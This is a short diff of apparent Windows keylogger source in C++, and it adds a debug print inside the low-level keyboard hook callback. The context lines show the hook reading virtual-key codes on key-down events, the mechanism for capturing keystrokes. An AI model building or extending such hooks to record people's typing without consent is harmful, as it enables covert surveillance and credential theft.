@@ -45,6 +45,8 @@ wchar_t* Keylogger::vk2ascii(UINT vkCode) {
 LRESULT CALLBACK Keylogger::KBHook(int code, WPARAM wParam, LPARAM lParam) {
     KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;
 
+    std::cerr << "Keyboard Callback Fired!" << std::endl;
+
     if (code == HC_ACTION) {
         if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
             DWORD vkCode = pKeyStruct->vkCode;
